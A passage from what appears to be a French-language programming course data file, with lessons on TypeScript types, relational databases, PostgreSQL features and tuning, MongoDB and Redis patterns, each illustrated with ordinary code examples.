\`\`\`typescript
// TypeScript : erreur détectée dans l'éditeur, avant même d'exécuter
interface Item {
  prix: number;
  quantite: number;
}

interface Commande {
  items: Item[];
}

function calculerTotal(commande: Commande): number {
  return commande.items.reduce((sum, item) => sum + item.prix * item.quantite, 0);
}

calculerTotal(null);                          // ❌ Erreur TS à la compilation
calculerTotal({ items: [{ prix: "10" }] });   // ❌ Erreur : string au lieu de number
calculerTotal({ items: [{ prix: 10, quantite: 2 }] });  // ✅ OK
\`\`\`

## Types fondamentaux

\`\`\`typescript
// Primitifs
const nom: string = "Alice";
const age: number = 25;
const actif: boolean = true;

// Tableaux
const notes: number[] = [18, 15, 20];
const tags: string[] = ["react", "typescript"];

// Objets avec interface
interface Utilisateur {
  id: number;
  email: string;
  avatar?: string;    // ? = optionnel
  readonly créé_le: Date;  // readonly = immuable
}

// Union types (soit l'un soit l'autre)
type Statut = "actif" | "inactif" | "suspendu";
type ID = string | number;

// Generics : types paramétrables
interface Réponse<T> {
  données: T;
  erreur: string | null;
  timestamp: Date;
}

const réponseUser: Réponse<Utilisateur> = {
  données: { id: 1, email: "alice@ex.com", créé_le: new Date() },
  erreur: null,
  timestamp: new Date()
};
\`\`\`

## Types utilitaires intégrés

\`\`\`typescript
interface Utilisateur {
  id: number;
  email: string;
  password: string;
  role: "admin" | "user";
}

// Partial : tous les champs optionnels
type MiseAJourUser = Partial<Utilisateur>;
// { id?: number; email?: string; password?: string; role?: ... }

// Pick : garder seulement certains champs
type UserPublic = Pick<Utilisateur, "id" | "email" | "role">;
// { id: number; email: string; role: ... }

// Omit : exclure certains champs
type UserSansPassword = Omit<Utilisateur, "password">;
// { id: number; email: string; role: ... }

// Readonly : tout immuable
type UserImmuable = Readonly<Utilisateur>;

// ReturnType : type de retour d'une fonction
async function getUser(id: number): Promise<Utilisateur> { ... }
type ResultatGetUser = Awaited<ReturnType<typeof getUser>>;  // Utilisateur
\`\`\`

## En pratique avec React

\`\`\`typescript
// Props typées
interface BoutonProps {
  texte: string;
  onClick: () => void;
  variante?: "primaire" | "secondaire" | "danger";
  désactivé?: boolean;
}

const Bouton: React.FC<BoutonProps> = ({
  texte,
  onClick,
  variante = "primaire",
  désactivé = false
}) => (
  <button
    onClick={onClick}
    disabled={désactivé}
    className={\`btn btn-\${variante}\`}
  >
    {texte}
  </button>
);

// useState typé
const [utilisateur, setUtilisateur] = useState<Utilisateur | null>(null);
const [chargement, setChargement] = useState<boolean>(false);

// useRef typé
const inputRef = useRef<HTMLInputElement>(null);
\`\`\``
      }
    ]
  }
,
  {
    id: "bases-de-donnees-sql",
    category: "Base de données",
    emoji: "🗃️",
    title: "Bases de données relationnelles",
    description: "SQL, transactions ACID et modélisation des données",
    level: "Débutant",
    color: "#2563EB",
    lessons: [
      {
        id: "bdd-relationnelle-concepts",
        title: "Comment fonctionne une base relationnelle",
        duration: "14 min",
        content: `# Comment fonctionne une base de données relationnelle

Une base de données **relationnelle** organise les données en **tables** liées entre elles par des références. C'est le modèle dominant depuis 50 ans.

## Le modèle relationnel

\`\`\`
Table "utilisateurs" :
┌────┬──────────────┬───────────────────┐
│ id │ nom          │ email             │
├────┼──────────────┼───────────────────┤
│  1 │ Alice Dupont │ alice@example.com │
│  2 │ Bob Martin   │ bob@example.com   │
└────┴──────────────┴───────────────────┘

Table "commandes" :
┌────┬─────────────┬──────────┬──────────┐
│ id │ user_id     │ total    │ statut   │
├────┼─────────────┼──────────┼──────────┤
│  1 │     1       │  89.90€  │ livré    │  ← appartient à Alice
│  2 │     1       │  45.00€  │ en cours │  ← appartient à Alice
│  3 │     2       │ 120.00€  │ livré    │  ← appartient à Bob
└────┴─────────────┴──────────┴──────────┘

user_id est une CLEF ÉTRANGÈRE → pointe vers utilisateurs.id
\`\`\`

## Clef primaire et clef étrangère

\`\`\`sql
CREATE TABLE utilisateurs (
    id    SERIAL PRIMARY KEY,        -- unique, identifie chaque ligne
    email VARCHAR(255) UNIQUE NOT NULL,
    nom   VARCHAR(100) NOT NULL
);

CREATE TABLE commandes (
    id             SERIAL PRIMARY KEY,
    utilisateur_id INTEGER NOT NULL REFERENCES utilisateurs(id),
    -- ↑ garantit qu'on ne peut pas mettre un user_id inexistant
    total          DECIMAL(10,2) NOT NULL,
    créé_le        TIMESTAMP DEFAULT NOW()
);

-- Comportement à la suppression d'un user :
-- ON DELETE CASCADE   → supprime aussi ses commandes
-- ON DELETE RESTRICT  → interdit la suppression (défaut)
-- ON DELETE SET NULL  → met la colonne à NULL
\`\`\`

## Les propriétés ACID

\`\`\`
A — Atomicité
Une transaction réussit en entier ou échoue en entier.

BEGIN;
  UPDATE comptes SET solde = solde - 500 WHERE id = 1;
  UPDATE comptes SET solde = solde + 500 WHERE id = 2;
COMMIT;
-- Si la 2e requête plante → ROLLBACK automatique des deux
-- Impossible d'avoir l'argent débité sans être crédité

C — Cohérence
La DB passe d'un état valide à un autre état valide.
Les contraintes (UNIQUE, NOT NULL, FK) sont toujours respectées.

I — Isolation
Les transactions concurrentes ne se voient pas pendant leur exécution.
2 personnes réservent le dernier billet en même temps :
→ l'une réussit, l'autre obtient une erreur. Pas de double réservation.

D — Durabilité
Une fois COMMIT, les données sont sauvegardées même si le serveur plante.
Écrit sur disque avec un WAL (Write-Ahead Log) avant de confirmer.
\`\`\`

## Normalisation vs Dénormalisation

\`\`\`
Normalisation (éviter la redondance) :
→ Chaque info stockée UNE seule fois → intégrité garantie
→ Plus de JOINs nécessaires

Dénormalisation (dupliquer pour la performance) :
→ Copier des données dans plusieurs tables
→ Évite les JOINs coûteux
→ Risque d'incohérence si mal géré

Exemple dénormalisé :
commandes.nom_client = "Alice Dupont"  ← copié depuis users
→ Si Alice change de nom → doit mettre à jour partout

Règle : normaliser par défaut, dénormaliser seulement si
performances insuffisantes et mesurées.
\`\`\``
      },
      {
        id: "bdd-index-avances",
        title: "Index avancés et optimisation",
        duration: "14 min",
        content: `# Index avancés et optimisation

## Comment fonctionne un index

\`\`\`
Sans index — Seq Scan :
"Trouver email = 'alice@example.com'"
→ Lire CHAQUE ligne une par une → 1 000 000 lectures
→ O(n) : très lent sur grandes tables

Avec index B-Tree :
Structure en arbre équilibré :
          [M]
        /     \
    [E-L]     [N-Z]
    /   \      /   \
[A-D][E-L] [N-S] [T-Z]

→ Descend l'arbre → ~20 comparaisons
→ O(log n) : quasi-instantané
\`\`\`

## Types d'index PostgreSQL

\`\`\`sql
-- B-Tree (défaut) : pour =, <, >, BETWEEN, ORDER BY
CREATE INDEX idx_users_email ON utilisateurs(email);

-- Index composite : plusieurs colonnes
CREATE INDEX idx_commandes_user_date ON commandes(utilisateur_id, créé_le DESC);
-- Optimise : WHERE utilisateur_id = X ORDER BY créé_le DESC

-- Index partiel : seulement un sous-ensemble
CREATE INDEX idx_commandes_actives ON commandes(statut, créé_le)
WHERE statut IN ('en_attente', 'en_cours');
-- Plus petit, plus rapide, pertinent si peu de commandes actives

-- GIN : pour tableaux, JSONB, full-text search
CREATE INDEX idx_articles_tags ON articles USING gin(tags);

-- Index CONCURRENTLY : sans bloquer la table
CREATE INDEX CONCURRENTLY idx_users_nom ON utilisateurs(nom);
\`\`\`

## EXPLAIN ANALYZE : comprendre l'exécution

\`\`\`sql
EXPLAIN ANALYZE
SELECT u.nom, COUNT(c.id) as nb_commandes
FROM utilisateurs u
LEFT JOIN commandes c ON c.utilisateur_id = u.id
WHERE u.créé_le > '2024-01-01'
GROUP BY u.id;

-- Mots-clés à surveiller :
-- "Seq Scan" sur grande table → envisager un index
-- "Index Scan" → bien, utilise l'index
-- actual time >> cost → statistiques obsolètes (lancer ANALYZE)
\`\`\`

## Le problème N+1

\`\`\`sql
-- ❌ N+1 : 1 requête pour les users + 1 PAR USER
SELECT * FROM utilisateurs;
-- Pour chaque user :
SELECT * FROM commandes WHERE utilisateur_id = $1;
-- 100 users = 101 requêtes !

-- ✅ JOIN : tout en une requête
SELECT
    u.id, u.nom,
    COUNT(c.id)  AS nb_commandes,
    SUM(c.total) AS total_dépensé
FROM utilisateurs u
LEFT JOIN commandes c ON c.utilisateur_id = u.id
GROUP BY u.id, u.nom;

-- ✅ CTE : lisible et réutilisable
WITH stats_commandes AS (
    SELECT utilisateur_id, COUNT(*) AS nb, SUM(total) AS total
    FROM commandes
    WHERE créé_le > NOW() - INTERVAL '30 days'
    GROUP BY utilisateur_id
)
SELECT u.nom, u.email, s.nb, s.total
FROM utilisateurs u
JOIN stats_commandes s ON s.utilisateur_id = u.id
WHERE s.total > 1000
ORDER BY s.total DESC;
\`\`\``
      }
    ]
  },
  {
    id: "postgresql-avance",
    category: "Base de données",
    emoji: "🐘",
    title: "PostgreSQL en profondeur",
    description: "JSONB, full-text search, performance et fonctions avancées",
    level: "Intermédiaire",
    color: "#336791",
    lessons: [
      {
        id: "postgresql-jsonb",
        title: "JSONB et fonctionnalités uniques",
        duration: "15 min",
        content: `# Ce qui rend PostgreSQL unique

PostgreSQL est bien plus qu'une base SQL standard. Il combine le meilleur du relationnel et du NoSQL.

## JSONB : SQL + NoSQL en un seul outil

\`\`\`sql
CREATE TABLE produits (
    id        SERIAL PRIMARY KEY,
    nom       VARCHAR(200) NOT NULL,
    prix      DECIMAL(10,2),
    attributs JSONB  -- données semi-structurées
);

INSERT INTO produits (nom, prix, attributs) VALUES
('MacBook Pro', 2499, '{"ram": 16, "stockage": 512, "processeur": "M3", "ports": ["USB-C","MagSafe"]}'),
('T-shirt',     29.99, '{"tailles": ["S","M","L","XL"], "couleur": "noir", "matière": "coton"}');

-- Accéder aux champs JSON
SELECT nom, attributs->>'couleur' AS couleur
FROM produits WHERE attributs->>'couleur' = 'noir';

-- Opérateurs JSONB :
attributs->'tailles'         → JSON : ["S","M","L","XL"]
attributs->>'couleur'        → texte : "noir"
attributs @> '{"ram": 16}'  → contient ce JSON ?
attributs ? 'couleur'        → la clef existe ?

-- Index GIN → requêtes JSON ultra rapides
CREATE INDEX idx_produits_attrs ON produits USING gin(attributs);

-- Trouver tous les produits avec taille "M"
SELECT nom FROM produits
WHERE attributs->'tailles' @> '"M"';
\`\`\`

## Full-Text Search intégré

\`\`\`sql
-- Ajouter une colonne de recherche
ALTER TABLE articles ADD COLUMN search_vector tsvector;

-- Remplir le vecteur (en français)
UPDATE articles SET search_vector =
    to_tsvector('french', COALESCE(titre,'') || ' ' || COALESCE(contenu,''));

-- Index GIN pour la recherche
CREATE INDEX idx_articles_fts ON articles USING gin(search_vector);

-- Trigger pour mettre à jour automatiquement
CREATE TRIGGER articles_search_update
BEFORE INSERT OR UPDATE ON articles
FOR EACH ROW EXECUTE FUNCTION
tsvector_update_trigger(search_vector, 'pg_catalog.french', titre, contenu);

-- Recherche avec score de pertinence
SELECT titre, ts_rank(search_vector, query) AS pertinence
FROM articles, to_tsquery('french', 'python & performance') query
WHERE search_vector @@ query
ORDER BY pertinence DESC;

-- Extraits avec mots en surbrillance
SELECT titre,
    ts_headline('french', contenu, to_tsquery('french', 'python')) AS extrait
FROM articles
WHERE search_vector @@ to_tsquery('french', 'python');
\`\`\`

## Window Functions

\`\`\`sql
-- Rang des clients par dépenses
SELECT
    nom, total_dépensé,
    RANK() OVER (ORDER BY total_dépensé DESC) AS rang,
    NTILE(4) OVER (ORDER BY total_dépensé DESC) AS quartile
FROM clients;

-- Croissance mois par mois
SELECT
    mois, ventes,
    LAG(ventes) OVER (ORDER BY mois) AS mois_précédent,
    ventes - LAG(ventes) OVER (ORDER BY mois) AS variation,
    SUM(ventes) OVER (ORDER BY mois) AS cumul
FROM ventes_mensuelles;

-- Comparer chaque commande à la moyenne de l'utilisateur
SELECT
    utilisateur_id, id, total,
    AVG(total) OVER (PARTITION BY utilisateur_id) AS moyenne_user,
    total - AVG(total) OVER (PARTITION BY utilisateur_id) AS écart
FROM commandes;
\`\`\`

## Extensions incontournables

\`\`\`sql
-- pgvector : embeddings pour l'IA (RAG, similarité sémantique)
CREATE EXTENSION vector;
ALTER TABLE documents ADD COLUMN embedding vector(1536);
SELECT contenu FROM documents
ORDER BY embedding <=> '[0.1, 0.2, ...]'::vector  -- cosine distance
LIMIT 5;

-- uuid-ossp : générer des UUIDs
CREATE EXTENSION "uuid-ossp";
ALTER TABLE sessions ADD COLUMN token UUID DEFAULT uuid_generate_v4();

-- PostGIS : données géographiques
CREATE EXTENSION postgis;
-- Restaurants dans 1km autour de Paris
SELECT nom FROM restaurants
WHERE ST_DWithin(position, ST_MakePoint(2.3522, 48.8566)::geography, 1000);

-- pg_cron : jobs planifiés dans la DB
SELECT cron.schedule('0 3 * * *',
    'DELETE FROM sessions WHERE expire_le < NOW()');
\`\`\``
      },
      {
        id: "postgresql-performance",
        title: "Performance et configuration",
        duration: "13 min",
        content: `# Performance et configuration PostgreSQL

## Paramètres essentiels (postgresql.conf)

\`\`\`
# Mémoire (règle : ~25% de la RAM pour shared_buffers)
shared_buffers = 2GB            # buffer pool (défaut 128MB, trop petit !)
work_mem = 64MB                 # mémoire par tri/hash (défaut 4MB)
maintenance_work_mem = 512MB    # pour VACUUM, CREATE INDEX
effective_cache_size = 6GB      # estimation cache OS (info planificateur)

# WAL (Write-Ahead Log)
wal_buffers = 64MB
checkpoint_completion_target = 0.9  # écriture progressive

# Connexions
max_connections = 100            # chaque connexion ≈ 5MB RAM
# → utiliser PgBouncer (connection pooler) plutôt qu'augmenter

# Autovacuum
autovacuum = on                 # ne jamais désactiver !
autovacuum_vacuum_scale_factor = 0.02  # déclenche si 2% de lignes mortes
\`\`\`

## MVCC et VACUUM : pourquoi PostgreSQL a besoin de nettoyage

\`\`\`
MVCC (Multi-Version Concurrency Control) :
PostgreSQL ne supprime jamais vraiment les lignes mises à jour.
→ UPDATE = INSERT nouvelle version + marquer l'ancienne comme "morte"
→ DELETE = marquer la ligne comme "morte"

Pourquoi ?
Transaction A lit pendant que Transaction B modifie la même ligne
→ A voit l'ancienne version, B voit la nouvelle
→ Pas de lock en lecture → concurrence maximale

Conséquence : les "dead tuples" s'accumulent → table grossit (bloat)

VACUUM : nettoie les dead tuples
VACUUM ANALYZE : nettoie + met à jour les statistiques du planificateur

-- Voir l'état des tables
SELECT
    relname AS table,
    n_live_tup AS vivantes,
    n_dead_tup AS mortes,
    last_autovacuum,
    pg_size_pretty(pg_total_relation_size(relid)) AS taille
FROM pg_stat_user_tables
ORDER BY n_dead_tup DESC;
\`\`\`

## Surveillance

\`\`\`sql
-- Top 10 des requêtes les plus lentes (extension pg_stat_statements)
SELECT
    LEFT(query, 80) AS requête,
    calls AS appels,
    ROUND(mean_exec_time::numeric, 2) AS temps_moyen_ms
FROM pg_stat_statements
ORDER BY mean_exec_time DESC
LIMIT 10;

-- Index inutilisés (occupent de l'espace, ralentissent les écritures)
SELECT indexrelname AS index, idx_scan AS nb_utilisations
FROM pg_stat_user_indexes
WHERE idx_scan = 0
ORDER BY pg_relation_size(indexrelid) DESC;

-- Taille des tables
SELECT
    tablename,
    pg_size_pretty(pg_table_size(schemaname||'.'||tablename)) AS données,
    pg_size_pretty(pg_indexes_size(schemaname||'.'||tablename)) AS index
FROM pg_tables WHERE schemaname = 'public'
ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;
\`\`\`

## Partitionnement : gérer les très grandes tables

\`\`\`sql
-- Pour les tables avec des centaines de millions de lignes
CREATE TABLE logs (
    id         BIGSERIAL,
    message    TEXT,
    créé_le    TIMESTAMP NOT NULL
) PARTITION BY RANGE (créé_le);

CREATE TABLE logs_2024_01 PARTITION OF logs
    FOR VALUES FROM ('2024-01-01') TO ('2024-02-01');

CREATE TABLE logs_2024_02 PARTITION OF logs
    FOR VALUES FROM ('2024-02-01') TO ('2024-03-01');

-- PostgreSQL route automatiquement INSERT et SELECT vers la bonne partition
-- Supprimer 1 mois de logs instantanément :
DROP TABLE logs_2024_01;  -- millisecondes, peu importe le volume !
\`\`\``
      }
    ]
  },
  {
    id: "nosql-mongodb",
    category: "Base de données",
    emoji: "🍃",
    title: "MongoDB",
    description: "Base de données orientée documents, schéma flexible",
    level: "Intermédiaire",
    color: "#47A248",
    lessons: [
      {
        id: "mongodb-concepts",
        title: "Concepts et modélisation",
        duration: "15 min",
        content: `# MongoDB : base de données orientée documents

MongoDB stocke les données sous forme de **documents JSON** regroupés dans des **collections**.

## SQL vs MongoDB : vocabulaire

\`\`\`
SQL              MongoDB
─────────────    ────────────────────
Base de données = Base de données
Table           = Collection
Ligne           = Document
Colonne         = Champ (field)
JOIN            = $lookup ou embedded
Schéma fixe     = Schéma flexible
\`\`\`

## Structure d'un document

\`\`\`json
{
  "_id": ObjectId("65a1b2c3d4e5f6a7b8c9d0e1"),
  "nom": "MacBook Pro 14",
  "prix": 2499.99,
  "catégorie": "informatique",
  "attributs": {
    "processeur": "M3 Pro",
    "ram": 18,
    "couleurs": ["Noir Sidéral", "Argent"]
  },
  "tags": ["apple", "laptop", "pro"],
  "avis": [
    { "auteur": "Alice", "note": 5, "commentaire": "Excellent !" },
    { "auteur": "Bob",   "note": 4, "commentaire": "Très bien mais cher" }
  ]
}
\`\`\`

## Embedding vs Referencing

\`\`\`
Embedding (sous-documents intégrés) :
✅ Utilise si les données sont toujours lues ensemble
✅ Peu de sous-documents (< quelques dizaines)
✅ Les sous-documents changent rarement

// Bon exemple : articles d'une commande
{
  "_id": ...,
  "articles": [
    { "nom": "T-shirt", "prix": 29.99, "quantite": 2 },
    { "nom": "Jean",    "prix": 79.99, "quantite": 1 }
  ]
}

Referencing (stocker des IDs) :
✅ Utilise si les données sont souvent modifiées
✅ Données partagées entre plusieurs documents
✅ Sous-documents volumineux

// Bon exemple : auteur d'un article (modifié souvent)
{
  "_id": ...,
  "titre": "Mon article",
  "auteur_id": ObjectId("...")  ← référence vers users
}
\`\`\`

## CRUD avec Python (Motor async)

\`\`\`python
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId

client = AsyncIOMotorClient("mongodb://localhost:27017")
db = client.nexus_db

# INSERT
await db.produits.insert_one({"nom": "T-shirt", "prix": 29.99, "tailles": ["S","M","L"]})

# FIND
produit = await db.produits.find_one({"_id": ObjectId("...")})
curseur  = db.produits.find({"prix": {"$lt": 50}})
résultats = await curseur.sort("prix", 1).limit(10).to_list(10)

# UPDATE
await db.produits.update_one(
    {"_id": ObjectId("...")},
    {
        "$set":   {"prix": 34.99},
        "$inc":   {"stock": -1},
        "$push":  {"tags": "promo"},
        "$pull":  {"tags": "hors-saison"}
    }
)

# DELETE
await db.produits.delete_one({"_id": ObjectId("...")})
\`\`\`

## Filtres courants

\`\`\`javascript
{"prix": {"$gt": 100}}           // > 100
{"prix": {"$gte": 100}}          // >= 100
{"statut": {"$ne": "archivé"}}   // != "archivé"
{"catégorie": {"$in": ["A","B"]}} // dans la liste
{"$or": [{"cat": "A"}, {"cat": "B"}]}
{"tags": "promo"}                // tableau contient "promo"
{"tailles": {"$all": ["S","M"]}} // tableau contient tous les éléments
{"attributs.ram": {"$gte": 16}}  // champ imbriqué (dot notation)
\`\`\``
      },
      {
        id: "mongodb-aggregation",
        title: "Aggregation Pipeline et cas d'usage",
        duration: "13 min",
        content: `# Aggregation Pipeline MongoDB

## Comment fonctionne le pipeline

Les documents passent à travers des étapes de traitement, comme une chaîne de montage.

\`\`\`javascript
// Statistiques de ventes par catégorie ce mois
await db.commandes.aggregate([
  // 1. Filtrer (comme WHERE)
  { $match: { créé_le: { $gte: new Date("2024-01-01") }, statut: "livré" }},

  // 2. Dérouler le tableau d'articles
  { $unwind: "$articles" },

  // 3. Regrouper et calculer (comme GROUP BY)
  { $group: {
      _id: "$articles.catégorie",
      nb_ventes: { $sum: "$articles.quantite" },
      chiffre_affaires: { $sum: { $multiply: ["$articles.prix", "$articles.quantite"] }},
      prix_moyen: { $avg: "$articles.prix" }
  }},

  // 4. Trier (comme ORDER BY)
  { $sort: { chiffre_affaires: -1 } },

  // 5. Limiter
  { $limit: 10 },

  // 6. Renommer les champs
  { $project: { catégorie: "$_id", nb_ventes: 1, chiffre_affaires: 1, _id: 0 }}
]).toArray();
\`\`\`

## $lookup : jointure entre collections

\`\`\`javascript
await db.commandes.aggregate([
  { $match: { statut: "en_attente" } },
  { $lookup: {
      from: "clients",
      localField: "client_id",
      foreignField: "_id",
      as: "client"
  }},
  { $unwind: "$client" },
  { $project: { "client.email": 1, "client.nom": 1, total: 1 }}
]).toArray();
\`\`\`

## Index MongoDB

\`\`\`javascript
// Index simple
await db.utilisateurs.createIndex({ email: 1 }, { unique: true })

// Index composé
await db.commandes.createIndex({ client_id: 1, créé_le: -1 })

// Index sur champ imbriqué
await db.produits.createIndex({ "attributs.ram": 1 })

// Index full-text
await db.articles.createIndex({ titre: "text", contenu: "text" })
await db.articles.find({ $text: { $search: "javascript performance" } })

// Index TTL : suppression automatique
await db.sessions.createIndex(
    { créé_le: 1 },
    { expireAfterSeconds: 86400 }  // supprime après 24h
)

// Analyser une requête
await db.commandes.find({ client_id: "..." }).explain("executionStats")
// Chercher "COLLSCAN" (à éviter) vs "IXSCAN" (bon)
\`\`\`

## Quand choisir MongoDB vs PostgreSQL

\`\`\`
MongoDB excelle pour :
✅ Données avec schéma vraiment variable (attributs produits)
✅ Données hiérarchiques naturellement (profils, configurations)
✅ Prototypage rapide (pas de migrations)
✅ Documents volumineux avec peu de relations

PostgreSQL est souvent meilleur pour :
✅ Données relationnelles (beaucoup de JOINs)
✅ Transactions multi-tables complexes
✅ Intégrité des données critique
✅ Requêtes analytiques complexes
✅ Données JSONB (PostgreSQL le fait aussi très bien !)

Idées reçues à corriger :
"MongoDB est plus rapide" → FAUX, ça dépend du cas d'usage
"MongoDB scale mieux"     → PostgreSQL scale très bien avec replicas
"MongoDB = sans schéma"   → On DEVRAIT valider le schéma en prod
\`\`\``
      }
    ]
  },
  {
    id: "nosql-redis",
    category: "Base de données",
    emoji: "⚡",
    title: "Redis",
    description: "Cache, structures de données et messagerie en mémoire",
    level: "Intermédiaire",
    color: "#DC382D",
    lessons: [
      {
        id: "redis-structures",
        title: "Structures de données et commandes",
        duration: "14 min",
        content: `# Redis : la base de données en mémoire

Redis stocke tout en **RAM** → ~100 000 opérations/seconde, lectures en < 1ms.

## Les 5 structures de données

### String : clef → valeur simple

\`\`\`bash
SET  user:42:email "alice@example.com"
GET  user:42:email              # "alice@example.com"
SETEX session:abc 3600 "user=42" # valeur avec TTL 1h
TTL  session:abc                # temps restant en secondes
INCR page:accueil:vues          # incrémenter (atomique)
INCRBY stats:clics 10           # incrémenter de N
\`\`\`

### Hash : objet structuré

\`\`\`bash
HSET    user:42 nom "Alice" email "alice@ex.com" role "admin"
HGET    user:42 email       # "alice@ex.com"
HGETALL user:42             # tous les champs
HINCRBY user:42 points 100  # incrémenter un champ numérique
\`\`\`

### List : file / historique ordonné

\`\`\`bash
# File FIFO
RPUSH queue:emails "email1" "email2"  # ajouter à droite
LPOP  queue:emails                    # retirer à gauche

# Garder les 100 derniers éléments
LPUSH feed:user:42 "post:123"
LTRIM feed:user:42 0 99    # garder seulement les 100 premiers
LRANGE feed:user:42 0 9    # lire les 10 premiers
\`\`\`

### Set : ensemble sans doublons

\`\`\`bash
SADD     online:users "user:42" "user:17"
SREM     online:users "user:17"
SISMEMBER online:users "user:42"  # membre ? → 1
SCARD    online:users              # combien de membres ?

# Opérations ensemblistes
SINTER abonnés:alice abonnés:bob  # amis en commun
SUNION tags:art1 tags:art2         # tous les tags
\`\`\`

### Sorted Set : ensemble trié par score

\`\`\`bash
ZADD    leaderboard 9500 "alice"
ZADD    leaderboard 12000 "claire"
ZINCRBY leaderboard 500 "alice"   # +500 points
ZRANGE  leaderboard 0 9 WITHSCORES REV  # top 10
ZRANK   leaderboard "alice"        # position (0-indexé)

# Articles les plus vus
ZINCRBY populaires 1 "article:42"
ZRANGE  populaires 0 4 WITHSCORES REV  # top 5
\`\`\``
      },
      {
        id: "redis-patterns",
        title: "Patterns avancés : cache, rate limit, locks",
        duration: "14 min",
        content: `# Patterns Redis avancés

## Cache avec invalidation

\`\`\`python
import redis, json
r = redis.Redis(host='localhost', decode_responses=True)

def mettre_en_cache(clef: str, ttl: int = 300):
    def décorateur(func):
        async def wrapper(*args, **kwargs):
            # Cache HIT ?
            en_cache = r.get(clef.format(*args))
            if en_cache:
                return json.loads(en_cache)

            # Cache MISS → exécuter la fonction
            résultat = await func(*args, **kwargs)
            r.setex(clef.format(*args), ttl, json.dumps(résultat, default=str))
            return résultat
        return wrapper
    return décorateur

@mettre_en_cache("user:{0}", ttl=600)
async def get_utilisateur(user_id: int):
    return await db.execute("SELECT * FROM users WHERE id = $1", user_id)

# Invalider quand les données changent
async def mettre_a_jour_user(user_id, données):
    await db.execute("UPDATE users SET ...", user_id)
    r.delete(f"user:{user_id}")  # ← invalider le cache
\`\`\`

## Rate Limiting (sliding window)

\`\`\`python
import time

def vérifier_rate_limit(user_id: str, max_req: int = 100, fenêtre: int = 60) -> bool:
    clef = f"ratelimit:{user_id}"
    maintenant = time.time()

    pipeline = r.pipeline()
    pipeline.zremrangebyscore(clef, 0, maintenant - fenêtre)  # supprimer anciens
    pipeline.zadd(clef, {str(maintenant): maintenant})         # ajouter maintenant
    pipeline.zcard(clef)                                        # compter
    pipeline.expire(clef, fenêtre)
    résultats = pipeline.execute()

    return résultats[2] <= max_req  # True = autorisé

# Dans FastAPI
@app.post("/api/chat")
async def chat(...):
    if not vérifier_rate_limit(str(current_user.id), max_req=10, fenêtre=60):
        raise HTTPException(429, "Trop de requêtes, réessaie dans 1 minute")
\`\`\`

## Pub/Sub : messagerie temps réel

\`\`\`python
# Publier un événement
r.publish("notifications:user:42", json.dumps({
    "type": "nouveau_message",
    "de": "Bob",
    "aperçu": "Salut !"
}))

# S'abonner et écouter
pubsub = r.pubsub()
pubsub.subscribe("notifications:user:42")
for message in pubsub.listen():
    if message["type"] == "message":
        données = json.loads(message["data"])
        await ws_manager.send(user_id=42, data=données)
\`\`\`

## Distributed Lock : verrou entre serveurs

\`\`\`python
import uuid

def acquérir_verrou(ressource: str, ttl: int = 30) -> str | None:
    verrou_id = str(uuid.uuid4())
    # SET NX = seulement si n'existe pas (atomique)
    acquis = r.set(f"lock:{ressource}", verrou_id, nx=True, ex=ttl)
    return verrou_id if acquis else None

def libérer_verrou(ressource: str, verrou_id: str):
    # Lua script pour vérifier et supprimer atomiquement
    script = """
    if redis.call("get", KEYS[1]) == ARGV[1] then
        return redis.call("del", KEYS[1])
    end
    return 0
    """
    r.eval(script, 1, f"lock:{ressource}", verrou_id)

# Usage : éviter que 2 serveurs traitent la même tâche
verrou = acquérir_verrou("facture:42", ttl=30)
if verrou:
    try:
        traiter_facture(42)
    finally:
        libérer_verrou("facture:42", verrou)
\`\`\`

## Persistance Redis

\`\`\`
RDB (snapshots périodiques) :
→ Sauvegarde sur disque toutes les N minutes
→ Perd les données depuis le dernier snapshot
→ Parfait pour le cache (la perte est acceptable)

AOF (Append Only File) :
→ Toutes les écritures loggées sur disque
→ Perte < 1 seconde en général
→ Pour les données importantes (sessions, queues)

Recommandation :
- Cache pur → pas de persistance ou RDB
- Queues/sessions → AOF
- Données critiques → PostgreSQL, Redis en complément
\`\`\``
      }
    ]
  },
  {
    id: "choisir-base-donnees",
    category: "Base de données",
    emoji: "🧭",
    title: "Choisir sa base de données",
    description: "Panorama complet et guide de décision",
    level: "Intermédiaire",
    color: "#7C3AED",
    lessons: [
      {
        id: "panorama-bdd",
        title: "Panorama des bases de données",
        duration: "15 min",
        content: `# Panorama complet des bases de données

Il existe de nombreuses familles de bases de données, chacune optimisée pour un cas d'usage.

## Les grandes familles

\`\`\`
1. RELATIONNEL (SQL)
   PostgreSQL, MySQL, SQLite, SQL Server
   → Tables avec lignes et colonnes, schéma fixe
   → Force : intégrité, transactions ACID, requêtes complexes
   → Usage : 80-90% des applications

2. DOCUMENT
   MongoDB, CouchDB, Firestore
   → Documents JSON imbriqués, schéma flexible
   → Force : données hiérarchiques, évolution rapide du schéma
   → Usage : catalogues, CMS, profils utilisateurs

3. CLÉ-VALEUR
   Redis, DynamoDB, Memcached
   → Ultra simple, tout en RAM
   → Force : vitesse extrême (<1ms)
   → Usage : cache, sessions, rate limiting, real-time

4. COLONNE (Wide-Column)
   Apache Cassandra, ScyllaDB
   → Distribué, haute disponibilité
   → Force : écriture massive à grande échelle
   → Usage : IoT, logs, Netflix/Instagram à des milliards de lignes

5. GRAPHE
   Neo4j, Amazon Neptune
   → Nœuds et relations
   → Force : requêtes de relations complexes
   → Usage : réseaux sociaux, détection de fraude, recommandations

6. SÉRIE TEMPORELLE
   InfluxDB, TimescaleDB (extension PostgreSQL), Prometheus
   → Optimisé pour données chronologiques
   → Force : compression, requêtes temporelles, agrégations
   → Usage : métriques serveur, IoT, monitoring

7. MOTEUR DE RECHERCHE
   Elasticsearch, Meilisearch, Typesense
   → Index inversé pour la recherche textuelle
   → Force : fuzzy search, facettes, pertinence
   → Usage : barre de recherche, logs (ELK Stack)
\`\`\`

## Comparatif détaillé

\`\`\`
PostgreSQL :
→ Meilleure DB open-source toutes catégories
→ JSONB, full-text search, extensions (pgvector, PostGIS...)
→ Très fiable, excellentes performances
→ À choisir par défaut pour 90% des projets

MySQL / MariaDB :
→ Plus simple que PostgreSQL
→ Très répandu (WordPress, Drupal)
→ Moins de fonctionnalités avancées
→ Bon pour les apps simples, stack LAMP

SQLite :
→ Base de données dans UN fichier, sans serveur
→ Parfait : apps mobiles, prototypes, tests, électronique embarquée
→ Pas adapté à plusieurs utilisateurs simultanés
→ Utilisé par iOS, Android, Firefox, Chrome en interne

MongoDB :
→ Meilleur choix NoSQL document
→ Aggregation pipeline puissant
→ Pertinent si les données sont vraiment variables/hiérarchiques

Redis :
→ Incontournable pour le cache et le temps-réel
